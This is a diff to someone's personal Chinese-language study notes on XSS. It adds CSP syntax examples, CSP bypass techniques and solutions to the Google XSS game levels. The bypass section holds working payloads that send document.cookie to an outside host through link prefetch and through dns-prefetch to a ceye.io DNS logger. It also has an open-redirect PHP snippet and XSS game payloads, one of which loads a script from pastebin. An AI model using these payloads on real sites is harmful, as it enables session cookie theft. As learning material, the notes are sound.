@@ -1,5 +1,15 @@
 # xss
 
+## 近期学习方向
+
+csp，浏览器的xss protect 
+
+dom-xss jsonp
+
+xss 跨域问题
+
+浏览器同源策略
+
 ## ssrf
 
 [利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
@@ -501,6 +511,350 @@ exp:
 
 
 
+
+
+## csp
+
+Content Security Policy （CSP）内容安全策略，是一个附加的安全层，有助于检测并缓解某些类型的攻击，包括跨站脚本（XSS）和数据注入攻击。
+
+CSP的特点就是他是在浏览器层面做的防护，是和同源策略同一级别，除非浏览器本身出现漏洞，否则不可能从机制上绕过。
+
+CSP只允许被认可的JS块、JS文件、CSS等解析，只允许向指定的域发起请求。
+
+### 语法
+
+https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
+
+https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy
+
+[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) :在其他资源类型没有符合自己的策略时应用该策略(有关完整列表查看[`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) )
+
+![img](https://images.seebug.org/content/images/2017/10/7b7e1d4c-9d9a-4bd0-ae6d-f266871fa300.png-w331s)
+
+![img](https://images.seebug.org/content/images/2017/10/c5a45eca-7e0c-4ebf-8143-712e4594f2fd.png-w331s)
+
+
+
+#### 示例 1
+
+
+
+一个网站管理者想要所有内容均来自站点的同一个源 (不包括其子域名)
+
+```html
+Content-Security-Policy: default-src 'self'
+```
+
+#### 示例 2
+
+
+
+一个网站管理者允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)
+
+```html
+Content-Security-Policy: default-src 'self' *.trusted.com
+```
+
+#### 示例 3
+
+
+
+一个网站管理者允许网页应用的用户在他们自己的内容中包含来自任何源的图片, 但是限制音频或视频需从信任的资源提供者(获得)，所有脚本必须从特定主机服务器获取可信的代码.
+
+```html
+Content-Security-Policy: default-src 'self'; img-src *; media-src media1.com media2.com; script-src userscripts.example.com
+```
+
+在这里，各种内容默认仅允许从文档所在的源获取, 但存在如下例外:
+
+- 图片可以从任何地方加载(注意 "*" 通配符)。
+- 多媒体文件仅允许从 media1.com 和 media2.com 加载(不允许从这些站点的子域名)。
+- 可运行脚本仅允许来自于userscripts.example.com。
+
+#### 示例 4
+
+
+
+一个线上银行网站的管理者想要确保网站的所有内容都要通过SSL方式获取，以避免攻击者窃听用户发出的请求。
+
+```html
+Content-Security-Policy: default-src https://onlinebanking.jumbobank.com
+```
+
+该服务器仅允许通过HTTPS方式并仅从onlinebanking.jumbobank.com域名来访问文档。
+
+#### 示例 5
+
+
+
+ 一个在线邮箱的管理者想要允许在邮件里包含HTML，同样图片允许从任何地方加载，但不允许JavaScript或者其他潜在的危险内容(从任意位置加载)。
+
+```html
+Content-Security-Policy: default-src 'self' *.mailsite.com; img-src *
+```
+
+ 注意这个示例并未指定[`script-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)。在此CSP示例中，站点通过 [`default-src`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) 指令的对其进行配置，这也同样意味着脚本文件仅允许从原始服务器获取。
+
+### 绕过
+
+https://evoa.me/index.php/archives/53/
+
+https://hurricane618.me/2018/06/30/csp-bypass-summary/
+
+https://cloud.tencent.com/developer/article/1073911
+
+https://paper.seebug.org/423/
+
+
+
+#### Content-Security-Policy: default-src 'self'; script-src 'self' 
+
+找到文件上传点,然后加载js
+
+或者利用jsonp来执行js代码
+
+重定向
+
+#### " Content-Security-Policy: default-src 'self '; script-src http://127.0.0.1/static/ "
+
+重定向
+
+如果可信域内存在一个可控的重定向文件，那么CSP的目录限制就可以被绕过。
+
+假设static目录下存在一个302文件
+
+```
+Static/302.php
+
+<?php Header("location: ".$_GET['url'])?>
+```
+
+像刚才一样，上传一个test.jpg 然后通过302.php跳转到upload目录加载js就可以成功执行
+
+```
+<script src="static/302.php?url=upload/test.jpg">
+```
+
+
+
+#### 利用标签来bypass
+
+
+
+#####  **Link Prefetch**
+
+在 HTML5 中有一个新特性，[Link Prefetch](https://developer.mozilla.org/en-US/docs/Web/HTTP/Link_prefetching_FAQ)(页面资源预加载)，浏览器会根据指示在空闲时预加载指定的页面，并把它们存储在缓存里，这样用户访问这些页面时，浏览器就能直接从缓存中提取出来，从而加快访问速度
+
+下面就说下几种可以实现预加载的方式
+
+**prefetch**
+
+一般是通过 link 标签来实现预加载的指
+
+`<link rel="prefetch" href="http://xxx.com">`
+
+
+
+但是在标签内的话是没办法打到 Cookie 的，但如果我们可以执行内联 JS，情况就不一样了
+
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
+
+
+
+如果 CSP 头是这样的，我们可以通过利用 JS 创建 link 标签的方式打到 Cookie
+
+```javascript
+
+
+<script>
+
+var i=document.createElement('link');
+
+i.setAttribute('rel','prefetch');
+
+i.setAttribute('href','http://xxx.com?'+document.cookie);
+
+document.head.appendChild(i);
+
+</script>
+```
+
+
+
+
+
+
+
+**dns-prefetch**
+
+dns-prefetch(DNS预解析) 允许浏览器在后台提前将资源的域名转换为 IP 地址，当用户访问该资源时就可以加快 DNS 解析。
+
+`<link rel="dns-prefetch" href="http://xxx.com">`
+
+同样想要在
+
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline';
+
+
+
+这种情况下收获 Cookie 的话
+
+```javascript
+
+
+<script>
+
+	 dcl = document.cookie.split(";");
+
+	 n0 = document.getElementsByTagName("HEAD")[0];
+
+
+
+	 for (var i=0; i<dcl.length;i++)
+
+	 {
+
+	       console.log(dcl[i]);
+
+	      n0.innerHTML = n0.innerHTML + "<link rel=\"dns-prefetch\" href=\"//" + escape(dcl[i].replace(/\//g, "-")).replace(/%/g, "_") + '.' + location.hostname.replace(/\./g, "-") +  ".wb7g7z.ceye.io\">";
+
+	}
+
+</script>
+```
+
+
+
+因为域名的命名规则是 [\.-a-zA-Z0-9]+，所以需要对一些特殊字符进行替换
+
+然后到 ns 服务器上获取 DNS 查询记录就可以了，我用的是这个[平台](http://ceye.io)
+
+**preconnect**
+
+preconnect(预连接)，与 DNS预解析 类似，但它不仅完成 DNS 预解析，还进行 TCP 握手和 TLS 协商
+
+利用方式和上面类似
+
+**preload**
+
+preload 是一个新的 web 标准，提供了取回当前页面的特定资源更多的控制。它聚焦于取回当前页面并且提供了高优先权，而 prefetch 以低优先权取回下一个页面的资源
+
+和其他属性值不同的是，它是由 connect-src 决定的，只有 CSP 长下面这样时才会对 href 里的资源发起请求
+
+Content-Security-Policy: default-src 'self'; connect-src *;
+
+然后就是和上面类似的 payload 了
+
+`<link rel="preload" href=http://xxx.com>`
+
+**prerender**
+
+测试了下好像已经不行了，没有 CSP 头也不行
+
 ## xss工具
 
 xss-proxy,xssshell,attackapi,anehta,avws
+
+## xss学习资源
+
+https://github.com/Ph0rse/Awesome-XSS 
+
+[https://blog.csdn.net/qq_35513598/article/details/79861908](qq://txfile/#)
+
+## 练习
+
+先知xss挑战赛 以及Google'xss挑战有能力的话把这两个搞下。
+
+## google xss
+
+### level1
+
+`<script>alert()</script>`
+
+### level 2
+
+`<img src="aaaaaaaa.jpg" onerror="alert()"></img>`
+
+### level 3
+
+代码审计发现
+
+```javascript
+html += "<img src='/static/level3/cloud" + num + ".jpg' />";
+```
+
+
+
+```javascript
+#' onerror="alert()" '#1
+```
+
+### level 4
+
+关键代码
+
+```python
+self.render_template('timer.html', { 'timer' : timer })
+```
+
+测试发现过滤了,`(,"`无法闭合
+
+于是构造
+
+`https://xss-game.appspot.com/level4/frame?timer=1'%2balert()%2b'1`
+
+### level 5
+
+`https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert()`
+
+关键代码:`<a href="{{ next }}">Next >></a>`
+
+
+
+### level 6
+
+
+
+关键代码:
+
+```javascript
+    function includeGadget(url) {
+      var scriptEl = document.createElement('script');
+ 
+      // This will totally prevent us from loading evil URLs!
+      if (url.match(/^https?:\/\//)) {
+        setInnerText(document.getElementById("log"),
+          "Sorry, cannot load a URL containing \"http\".");
+        return;
+      }
+ 
+      // Load this awesome gadget
+      scriptEl.src = url;
+ 
+      // Show log messages
+      scriptEl.onload = function() { 
+        setInnerText(document.getElementById("log"),  
+          "Loaded gadget from " + url);
+      }
+      scriptEl.onerror = function() { 
+        setInnerText(document.getElementById("log"),  
+          "Couldn't load gadget from " + url);
+      }
+ 
+      document.head.appendChild(scriptEl);
+    }
+```
+
+
+
+网页会根据#号后面的内容创建script标签
+
+但是过滤了http和https为开始的url
+
+但是当我们输入//xxx的时候,浏览器会把当前网址的协议当做这个网址的协议,于是我们成功绕过过滤
+
+`//pastebin.com/raw/0eAVjVxh`
+
+
+
+这一题data协议也能做
